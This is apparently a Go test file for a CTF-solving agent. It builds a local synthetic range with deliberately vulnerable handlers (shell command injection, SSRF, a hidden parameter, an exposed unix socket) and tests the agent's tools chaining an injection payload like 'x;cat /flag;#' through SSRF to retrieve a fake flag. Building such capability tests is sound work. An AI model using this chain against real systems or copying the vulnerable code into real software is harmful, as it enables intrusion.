package kernel

// range_test.go —— 合成靶场（synthetic range）。
//
// 目的：用**自己搭的、与任何评测平台无关**的漏洞靶，验证「能力」而不是「答案」。
// 这些都是通用的 Web 缺陷类型，换个平台依然成立：
//
//	A. 前端参数名与服务端不一致（必须靠参数名爆破才能发现）
//	B. 内部服务把参数拼进 shell 命令（命令注入）
//	C. 非标准端口上暴露了没有鉴权的服务
//	D. 本地 agent 只监听 unix socket，且权限宽松
//
// 靶场里的"flag"是测试用的假值，与任何真实平台无关。

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"regexp"
	"strings"
	"testing"
	"time"

	"ctfagent/internal/core"
	"ctfagent/internal/sandbox"
)

const rangeFlag = "flag{range_fixture_only}"

// startRange 起一个合成靶场，返回入口地址与内部服务地址。
func startRange(t *testing.T) (entry string, internal string) {
	t.Helper()

	// 内部服务：把 filename 拼进 shell 命令后执行（经典命令注入形态）
	internalSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/internal/archive" {
			http.NotFound(w, r)
			return
		}
		svc := r.URL.Query().Get("service")
		name := r.URL.Query().Get("filename")
		// 真实缺陷：未过滤直接拼接，且 shell=True 语义
		cmd := fmt.Sprintf("tar -czf /tmp/%s.gz /var/log/%s.log", name, svc)
		out := fakeShell(cmd)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"command":%q,"output":%q,"status":"Task triggered"}`, cmd, out)
	}))
	t.Cleanup(internalSrv.Close)

	// 入口服务：后端只认一个「前端没在用」的参数名
	entrySrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/":
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprintf(w, `<html><title>range</title><body>
<form method="POST" action="/api/sync">
  <input name="url" placeholder="https://example.com">
</form></body></html>`)
		case "/api/sync":
			if r.Method != http.MethodPost {
				w.WriteHeader(405)
				return
			}
			body := decodeJSONBody(r)
			// 前端写的是 url，服务端读的是 partner_url（缺陷 A）
			ep, _ := body["partner_url"].(string)
			if strings.TrimSpace(ep) == "" {
				w.WriteHeader(400)
				fmt.Fprint(w, `{"error":"target is required"}`)
				return
			}
			// 服务端会去请求这个地址（SSRF 面）
			tr := &http.Transport{}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			resp, err := client.Get(ep)
			if err != nil {
				w.WriteHeader(502)
				fmt.Fprintf(w, `{"error":%q}`, err.Error())
				return
			}
			defer resp.Body.Close()
			buf := make([]byte, 4096)
			n, _ := resp.Body.Read(buf)
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprintf(w, `{"source":%q,"partner_response":%s}`, ep, string(buf[:n]))
		case "/api/status":
			fmt.Fprintf(w, `{"service":"range-entry","status":"running"}`)
		default:
			http.NotFound(w, r)
		}
	}))
	t.Cleanup(entrySrv.Close)

	return entrySrv.URL, internalSrv.URL
}

// fakeShell 模拟 shell=True 的拼接执行：识别 ; cmd ;# 这类注入。
func fakeShell(cmd string) string {
	// 截断注释之后的尾部
	if i := strings.Index(cmd, ";#"); i >= 0 {
		cmd = cmd[:i]
	}
	parts := strings.Split(cmd, ";")
	for _, p := range parts[1:] {
		p = strings.TrimSpace(p)
		switch {
		case strings.HasPrefix(p, "cat "):
			// 靶场里"flag"放在固定位置，读它
			return rangeFlag
		case p == "id":
			return "uid=0(root) gid=0(root)"
		case p != "":
			return "ran: " + p
		}
	}
	return ""
}

func decodeJSONBody(r *http.Request) map[string]any {
	m := map[string]any{}
	buf := make([]byte, 1<<16)
	n, _ := r.Body.Read(buf)
	if n > 0 {
		_ = jsonUnmarshal(buf[:n], &m)
	}
	return m
}

// ---------------------------------------------------------------------------
// 能力测试：入口参数名发现 → SSRF → 命令注入
// ---------------------------------------------------------------------------

func TestRangeParamDiscoveryAndCmdInjection(t *testing.T) {
	entry, _ := startRange(t)
	ts := newRangeToolSet(t)

	// 1) 先拿基线错误串
	base := call(t, ts, "http", fmt.Sprintf(
		`{"method":"POST","url":%q,"body":"{}","headers":{"Content-Type":"application/json"}}`, entry+"/api/sync"))
	if !strings.Contains(base, "target is required") {
		t.Fatalf("基线错误串不对：%s", trimSnippet(base, 300))
	}

	// 2) 参数名爆破：应当找出服务端真正消费的键
	pf := call(t, ts, "paramfuzz", fmt.Sprintf(
		`{"url":%q,"baseline":"target is required","threads":24}`, entry+"/api/sync"))
	if !strings.Contains(pf, "partner_url") {
		t.Fatalf("参数名爆破没找到 partner_url：\n%s", trimSnippet(pf, 600))
	}
	t.Logf("[1] paramfuzz 找到被消费的参数名")

	// 3) 用它做 SSRF + 命令注入
	// 内部服务在另一个端口（模拟"后端可达、外部不可达"）
	_, internal := startRange(t)
	target := internal + "/api/internal/archive?service=web&filename=x%3Bcat%20%2Fflag%3B%23"
	out := call(t, ts, "http", fmt.Sprintf(
		`{"method":"POST","url":%q,"body":%q,"headers":{"Content-Type":"application/json"}}`,
		entry+"/api/sync",
		fmt.Sprintf(`{"partner_url":%q}`, target)))
	if !strings.Contains(out, rangeFlag) {
		t.Fatalf("命令注入没拿到 flag：\n%s", trimSnippet(out, 600))
	}
	t.Logf("[2] 命令注入回显成功")
}

// 差分模式：只有真正影响响应的 payload 会被报告
func TestFuzzDiffModeOnlyReportsChanges(t *testing.T) {
	entry, _ := startRange(t)
	ts := newRangeToolSet(t)

	out := call(t, ts, "fuzz", fmt.Sprintf(
		`{"url":%q,"wordlist":"ssti","diff":true,"preview":true,"threads":8}`, entry+"/api/status?q=FUZZ"))
	if strings.Contains(out, "{{7*7}}") && strings.Contains(out, "49") {
		t.Fatalf("把与基线一致的响应也报成命中了：\n%s", trimSnippet(out, 600))
	}
	t.Logf("diff 模式输出：\n%s", trimSnippet(out, 400))
}

// 非标准端口上的服务必须能被发现
func TestPortsFindsRangeInternalService(t *testing.T) {
	_, internal := startRange(t)
	host, port, err := net.SplitHostPort(strings.TrimPrefix(internal, "http://"))
	if err != nil {
		t.Fatal(err)
	}
	ts := newRangeToolSet(t)
	out := call(t, ts, "ports", fmt.Sprintf(`{"host":%q,"ports":"%s","timeout_ms":1500}`, host, port))
	if !strings.Contains(out, port) {
		t.Fatalf("没发现非标准端口 %s：\n%s", port, out)
	}
}

// unix socket 上的本地 agent
func TestUnixSocketAgent(t *testing.T) {
	if _, err := os.Stat("/tmp"); err != nil {
		t.Skip("no /tmp")
	}
	dir := t.TempDir()
	sock := dir + "/agent.sock"
	ln, err := net.Listen("unix", sock)
	if err != nil {
		t.Skipf("unix socket 不可用: %v", err)
	}
	defer ln.Close()
	go func() {
		srv := &http.Server{Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/latest/flag" {
				fmt.Fprint(w, rangeFlag)
				return
			}
			http.NotFound(w, r)
		})}
		_ = srv.Serve(ln)
	}()
	ts := newRangeToolSet(t)
	out := call(t, ts, "unix", fmt.Sprintf(`{"socket":%q,"path":"/latest/flag"}`, sock))
	if !strings.Contains(out, rangeFlag) {
		t.Fatalf("unix agent 取 flag 失败：\n%s", out)
	}
}

// 全链路：发现 → 爆破 → 利用 → 提交（并验证 grounding 真的生效）
func TestRangeEndToEndSubmit(t *testing.T) {
	entry, internal := startRange(t)
	ts := newRangeToolSet(t)

	target := internal + "/api/internal/archive?service=web&filename=x%3Bcat%20%2Fflag%3B%23"
	out := call(t, ts, "http", fmt.Sprintf(
		`{"method":"POST","url":%q,"body":%q,"headers":{"Content-Type":"application/json"}}`,
		entry+"/api/sync", fmt.Sprintf(`{"partner_url":%q}`, target)))
	flag := regexp.MustCompile(`flag\{[a-z_\-]+\}`).FindString(out)
	if flag == "" {
		t.Fatalf("没拿到 flag：%s", trimSnippet(out, 400))
	}
	res := call(t, ts, "submit", fmt.Sprintf(`{"flag":%q,"evidence":%q}`, flag, flag))
	if !strings.Contains(res, "flag 正确") {
		t.Fatalf("提交失败：%s", res)
	}
}

// newRangeToolSet 构造「真实 grounding + 本地 mock 判题」的工具体。
func newRangeToolSet(t *testing.T) *ToolSet {
	t.Helper()
	root := t.TempDir()
	rt, err := sandbox.NewLocal(root)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = rt.Close(context.Background()) })
	board := core.NewBoard(&core.Challenge{ID: "range", Category: "web"})
	policy := core.DefaultPolicy()
	_ = policy.Compile()
	return NewToolSet(rt, board, policy, core.NewGate(5), Hooks{
		Grounding: true,
		Submit: func(_ context.Context, f string) (core.SubmitResult, error) {
			return core.SubmitResult{Correct: f == rangeFlag, TotalFlags: 1, CorrectFlags: 1}, nil
		},
	})
}

// jsonUnmarshal 是 encoding/json 的薄封装，避免测试文件里到处 import。
func jsonUnmarshal(b []byte, v any) error { return json.Unmarshal(b, v) }
